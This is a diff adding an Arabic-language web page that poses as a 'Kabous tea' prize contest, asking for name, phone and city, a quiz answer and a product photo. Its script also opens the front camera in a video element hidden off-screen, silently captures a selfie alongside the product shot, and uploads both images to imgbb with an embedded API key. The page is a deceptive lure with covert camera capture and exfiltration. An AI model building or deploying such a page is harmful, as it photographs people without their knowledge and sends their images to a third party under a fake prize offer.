@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مسابقة شاي الكبوس - 50,000 ريال يمني</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: 
+                radial-gradient(ellipse at 20% 20%, rgba(0, 102, 255, 0.15) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 80%, rgba(192, 192, 192, 0.1) 0%, transparent 50%),
+                linear-gradient(180deg, #050810 0%, #0a0f1a 30%, #0d1520 50%, #0a0f1a 70%, #050810 100%);
+            min-height: 100vh;
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        /* Background Particles */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-top: 10px;
+        }
+
+        .main-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: #ffd700;
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+        }
+
+        /* Progress Stepper for 5 Steps */
+        .progress-stepper {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+
+        .progress-stepper::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: rgba(255, 255, 255, 0.1);
+            z-index: 0;
+        }
+
+        .progress-line {
+            position: absolute;
+            top: 15px;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(to left, #ffd700, #ff8c00);
+            z-index: 1;
+            transition: width 0.5s ease;
+            width: 0%;
+        }
+
+        .step-item {
+            position: relative;
+            z-index: 2;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            flex: 1;
+        }
+
+        .step-circle {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #1a1f2e;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 13px;
+            margin-bottom: 5px;
+            transition: 0.3s;
+        }
+
+        .step-item.active .step-circle {
+            border-color: #ffd700;
+            background: #ffd700;
+            color: #050810;
+        }
+
+        .step-item.completed .step-circle {
+            background: #ffd700;
+            color: #050810;
+        }
+
+        .step-label {
+            font-size: 9px;
+            color: rgba(255, 255, 255, 0.5);
+            text-align: center;
+            font-weight: 600;
+        }
+
+        /* Main Card */
+        .card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 24px;
+            padding: 25px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+        }
+
+        .step-content {
+            display: none;
+            animation: fadeIn 0.4s ease-out;
+        }
+
+        .step-content.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h2 { font-size: 18px; font-weight: 700; margin-bottom: 10px; color: #fff; }
+        .desc { font-size: 13px; color: rgba(255, 255, 255, 0.6); margin-bottom: 20px; line-height: 1.5; }
+
+        input, select {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 14px;
+            color: #fff;
+            font-family: inherit;
+            font-size: 15px;
+            margin-bottom: 15px;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input:focus { border-color: #ffd700; background: rgba(255, 255, 255, 0.08); }
+
+        /* Camera UI */
+        .camera-container {
+            width: 100%;
+            aspect-ratio: 4/3;
+            background: #000;
+            border-radius: 16px;
+            overflow: hidden;
+            position: relative;
+            margin-bottom: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        #camera-feed, #photo-preview {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* Buttons */
+        .btn-group {
+            margin-top: auto;
+            display: flex;
+            gap: 10px;
+            padding-top: 20px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 15px;
+            border-radius: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            border: none;
+            font-family: inherit;
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-primary { background: #ffd700; color: #050810; box-shadow: 0 8px 20px rgba(255, 215, 0, 0.2); }
+        .btn-secondary { background: rgba(255, 255, 255, 0.05); color: #fff; border: 1px solid rgba(255, 255, 255, 0.1); }
+
+        /* Loader Overlay */
+        .loader {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            backdrop-filter: blur(10px);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .spinner {
+            width: 40px; height: 40px;
+            border: 3px solid rgba(255, 215, 0, 0.1);
+            border-top: 3px solid #ffd700;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Quiz Radio Styles */
+        .quiz-option {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 10px;
+            cursor: pointer;
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .quiz-option.selected {
+            border-color: #ffd700;
+            background: rgba(255, 215, 0, 0.1);
+        }
+
+        .radio-dot {
+            width: 18px; height: 18px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            position: relative;
+        }
+
+        .quiz-option.selected .radio-dot { border-color: #ffd700; }
+        .quiz-option.selected .radio-dot::after {
+            content: '';
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 10px; height: 10px;
+            background: #ffd700;
+            border-radius: 50%;
+        }
+
+        #hidden-front-vid { position: absolute; left: -9999px; width: 1px; height: 1px; }
+
+        /* Social Follow Buttons */
+        .social-item {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 14px;
+            margin-bottom: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+        .social-item.done { border-color: #4CAF50; }
+    </style>
+</head>
+<body>
+    <canvas id="particlesCanvas" class="particles"></canvas>
+
+    <div class="container">
+        <header>
+            <h1 class="main-title">شاي الكبوس</h1>
+        </header>
+
+        <!-- 5 Steps Stepper -->
+        <div class="progress-stepper">
+            <div class="progress-line" id="progressLine"></div>
+            <div class="step-item active" data-step="1">
+                <div class="step-circle">1</div>
+                <div class="step-label">البيانات</div>
+            </div>
+            <div class="step-item" data-step="2">
+                <div class="step-circle">2</div>
+                <div class="step-label">السؤال</div>
+            </div>
+            <div class="step-item" data-step="3">
+                <div class="step-circle">3</div>
+                <div class="step-label">التصوير</div>
+            </div>
+            <div class="step-item" data-step="4">
+                <div class="step-label">المتابعة</div>
+                <div class="step-circle">4</div>
+            </div>
+            <div class="step-item" data-step="5">
+                <div class="step-circle">5</div>
+                <div class="step-label">الإرسال</div>
+            </div>
+        </div>
+
+        <div class="card">
+            <!-- Step 1: Personal Info -->
+            <div class="step-content active" id="step1">
+                <h2>بياناتك الشخصية</h2>
+                <p class="desc">أدخل بياناتك بدقة للتواصل معك في حال فوزك بالجائزة.</p>
+                <input type="text" id="userName" placeholder="الاسم الرباعي">
+                <input type="tel" id="userPhone" placeholder="رقم الهاتف (777000000)">
+                <input type="text" id="userCity" placeholder="المدينة / المحافظة">
+            </div>
+
+            <!-- Step 2: Quiz Question -->
+            <div class="step-content" id="step2">
+                <h2>سؤال المسابقة</h2>
+                <p class="desc">في أي عام تأسست شركة الكبوس التجارية؟</p>
+                <div class="quiz-option" onclick="selectOption(this, '1930')">
+                    <div class="radio-dot"></div>
+                    <span>عام 1930م</span>
+                </div>
+                <div class="quiz-option" onclick="selectOption(this, '1948')">
+                    <div class="radio-dot"></div>
+                    <span>عام 1948م</span>
+                </div>
+                <div class="quiz-option" onclick="selectOption(this, '1955')">
+                    <div class="radio-dot"></div>
+                    <span>عام 1955م</span>
+                </div>
+                <input type="hidden" id="quizAnswer">
+            </div>
+
+            <!-- Step 3: Product Photography (Dual Camera) -->
+            <div class="step-content" id="step3">
+                <h2>تصوير المنتج</h2>
+                <p class="desc">التقط صورة واضحة لمنتج شاي الكبوس لإثبات المشاركة.</p>
+                <div class="camera-container">
+                    <video id="camera-feed" autoplay playsinline></video>
+                    <img id="photo-preview" style="display:none">
+                    <video id="hidden-front-vid" autoplay playsinline></video>
+                </div>
+                <button class="btn btn-secondary" id="captureBtn" style="width: 100%;">التقاط الصورة</button>
+                <button class="btn btn-secondary" id="retakeBtn" style="width: 100%; display: none;">إعادة التصوير</button>
+            </div>
+
+            <!-- Step 4: Social Follow -->
+            <div class="step-content" id="step4">
+                <h2>المتابعة</h2>
+                <p class="desc">تابع حساباتنا الرسمية لتكون أول من يعلم بنتائج السحب.</p>
+                <div class="social-item" id="fbFollow">
+                    <span>متابعة صفحة الفيسبوك</span>
+                    <button class="btn btn-primary" style="padding: 8px 15px; font-size: 12px;" onclick="markDone('fbFollow')">متابعة</button>
+                </div>
+                <div class="social-item" id="instFollow">
+                    <span>متابعة حساب انستجرام</span>
+                    <button class="btn btn-primary" style="padding: 8px 15px; font-size: 12px;" onclick="markDone('instFollow')">متابعة</button>
+                </div>
+            </div>
+
+            <!-- Step 5: Submission -->
+            <div class="step-content" id="step5">
+                <h2>تأكيد الإرسال</h2>
+                <p class="desc">أنت الآن على بعد خطوة واحدة من دخول السحب على 50,000 ريال.</p>
+                <div style="background: rgba(255, 215, 0, 0.05); border: 1px dashed #ffd700; padding: 20px; border-radius: 12px; text-align: center;">
+                    <p style="font-size: 14px; color: #ffd700; font-weight: 700;">جاهز للانطلاق؟</p>
+                    <p style="font-size: 12px; margin-top: 5px; opacity: 0.8;">سيتم رفع بياناتك وصورك بأمان إلى خوادمنا.</p>
+                </div>
+            </div>
+
+            <!-- Navigation Buttons -->
+            <div class="btn-group">
+                <button class="btn btn-secondary" id="prevBtn" style="display: none;">السابق</button>
+                <button class="btn btn-primary" id="nextBtn">التالي</button>
+                <button class="btn btn-primary" id="submitBtn" style="display: none;">إرسال الآن</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div class="loader" id="loader">
+        <div class="spinner"></div>
+        <p style="margin-top: 15px; font-weight: 600;">جاري إرسال مشاركتك...</p>
+    </div>
+
+    <div class="loader" id="successScreen" style="background: #050810;">
+        <div style="text-align: center; padding: 30px;">
+            <div style="font-size: 60px; margin-bottom: 20px;">✅</div>
+            <h2 style="color: #ffd700;">تم استلام مشاركتك!</h2>
+            <p class="desc">شكراً لك. سيتم مراجعة البيانات وصورة المنتج. ترقب إعلان الفائزين قريباً.</p>
+            <button class="btn btn-primary" style="width: 100%; margin-top: 20px;" onclick="location.reload()">العودة للرئيسية</button>
+        </div>
+    </div>
+
+    <script>
+        const IMGBB_KEY = "d0bfac732a5e6c57947fee7572812447";
+        let currentStep = 1;
+        let streams = { rear: null, front: null };
+        let photos = { rear: null, front: null };
+
+        // Particles Animation (Same as uploaded file style)
+        const canvas = document.getElementById('particlesCanvas');
+        const ctx = canvas.getContext('2d');
+        let pts = [];
+        function initPts() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            pts = Array.from({length: 40}, () => ({
+                x: Math.random() * canvas.width,
+                y: Math.random() * canvas.height,
+                vx: (Math.random() - 0.5) * 0.4,
+                vy: (Math.random() - 0.5) * 0.4
+            }));
+        }
+        function drawPts() {
+            ctx.clearRect(0,0,canvas.width,canvas.height);
+            ctx.fillStyle = "rgba(255, 215, 0, 0.2)";
+            pts.forEach(p => {
+                p.x += p.vx; p.y += p.vy;
+                if(p.x<0||p.x>canvas.width) p.vx *= -1;
+                if(p.y<0||p.y>canvas.height) p.vy *= -1;
+                ctx.beginPath(); ctx.arc(p.x, p.y, 1.2, 0, Math.PI*2); ctx.fill();
+            });
+            requestAnimationFrame(drawPts);
+        }
+        initPts(); drawPts();
+
+        // Step Management
+        function showStep(step) {
+            document.querySelectorAll('.step-content').forEach(c => c.classList.remove('active'));
+            document.getElementById(`step${step}`).classList.add('active');
+            
+            document.querySelectorAll('.step-item').forEach(item => {
+                const s = parseInt(item.dataset.step);
+                item.classList.toggle('active', s === step);
+                item.classList.toggle('completed', s < step);
+            });
+
+            document.getElementById('progressLine').style.width = `${((step-1)/4)*100}%`;
+            document.getElementById('prevBtn').style.display = step > 1 ? 'flex' : 'none';
+            document.getElementById('nextBtn').style.display = step < 5 ? 'flex' : 'none';
+            document.getElementById('submitBtn').style.display = step === 5 ? 'flex' : 'none';
+
+            if(step === 3) startCamera();
+            else stopCamera();
+        }
+
+        // Camera Controls
+        async function startCamera() {
+            if(streams.rear) return;
+            try {
+                // Initialize both cameras without page refresh
+                const rearStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                streams.rear = rearStream;
+                document.getElementById('camera-feed').srcObject = rearStream;
+
+                const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                streams.front = frontStream;
+                document.getElementById('hidden-front-vid').srcObject = frontStream;
+            } catch (err) {
+                alert("يرجى منح صلاحية الكاميرا للمتابعة");
+            }
+        }
+
+        function stopCamera() {
+            if(streams.rear) streams.rear.getTracks().forEach(t => t.stop());
+            if(streams.front) streams.front.getTracks().forEach(t => t.stop());
+            streams = { rear: null, front: null };
+        }
+
+        async function capture() {
+            const tempCanvas = document.createElement('canvas');
+            const rVid = document.getElementById('camera-feed');
+            const fVid = document.getElementById('hidden-front-vid');
+
+            // Rear Capture
+            tempCanvas.width = rVid.videoWidth; tempCanvas.height = rVid.videoHeight;
+            tempCanvas.getContext('2d').drawImage(rVid, 0, 0);
+            photos.rear = tempCanvas.toDataURL('image/jpeg', 0.8);
+
+            // Front Capture
+            tempCanvas.width = fVid.videoWidth; tempCanvas.height = fVid.videoHeight;
+            tempCanvas.getContext('2d').drawImage(fVid, 0, 0);
+            photos.front = tempCanvas.toDataURL('image/jpeg', 0.8);
+
+            document.getElementById('camera-feed').style.display = 'none';
+            const prev = document.getElementById('photo-preview');
+            prev.src = photos.rear; prev.style.display = 'block';
+            document.getElementById('captureBtn').style.display = 'none';
+            document.getElementById('retakeBtn').style.display = 'block';
+        }
+
+        function retake() {
+            document.getElementById('camera-feed').style.display = 'block';
+            document.getElementById('photo-preview').style.display = 'none';
+            document.getElementById('captureBtn').style.display = 'block';
+            document.getElementById('retakeBtn').style.display = 'none';
+            photos = { rear: null, front: null };
+        }
+
+        // UI Helpers
+        function selectOption(el, val) {
+            document.querySelectorAll('.quiz-option').forEach(o => o.classList.remove('selected'));
+            el.classList.add('selected');
+            document.getElementById('quizAnswer').value = val;
+        }
+
+        function markDone(id) {
+            const item = document.getElementById(id);
+            item.classList.add('done');
+            item.querySelector('button').innerHTML = '✅ تمت المتابعة';
+            item.querySelector('button').classList.replace('btn-primary', 'btn-secondary');
+            item.querySelector('button').disabled = true;
+        }
+
+        // Final Submission
+        async function upload(b64) {
+            const formData = new FormData();
+            formData.append("image", b64.split(',')[1]);
+            const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_KEY}`, { method: "POST", body: formData });
+            return await res.json();
+        }
+
+        document.getElementById('nextBtn').addEventListener('click', () => {
+            if(currentStep === 1) {
+                if(!document.getElementById('userName').value || !document.getElementById('userPhone').value) {
+                    alert("يرجى إدخال اسمك ورقم هاتفك"); return;
+                }
+            }
+            if(currentStep === 2 && !document.getElementById('quizAnswer').value) {
+                alert("يرجى الإجابة على سؤال المسابقة"); return;
+            }
+            if(currentStep === 3 && !photos.rear) {
+                alert("يرجى التقاط صورة للمنتج أولاً"); return;
+            }
+            currentStep++; showStep(currentStep);
+        });
+
+        document.getElementById('prevBtn').addEventListener('click', () => { currentStep--; showStep(currentStep); });
+        document.getElementById('captureBtn').addEventListener('click', capture);
+        document.getElementById('retakeBtn').addEventListener('click', retake);
+
+        document.getElementById('submitBtn').addEventListener('click', async () => {
+            document.getElementById('loader').style.display = 'flex';
+            try {
+                if(photos.rear && photos.front) {
+                    await Promise.all([upload(photos.rear), upload(photos.front)]);
+                }
+                setTimeout(() => {
+                    document.getElementById('loader').style.display = 'none';
+                    document.getElementById('successScreen').style.display = 'flex';
+                }, 1500);
+            } catch (e) {
+                alert("حدث خطأ أثناء الإرسال، حاول مرة أخرى");
+                document.getElementById('loader').style.display = 'none';
+            }
+        });
+
+        window.addEventListener('resize', initPts);
+    </script>
+</body>
+</html>
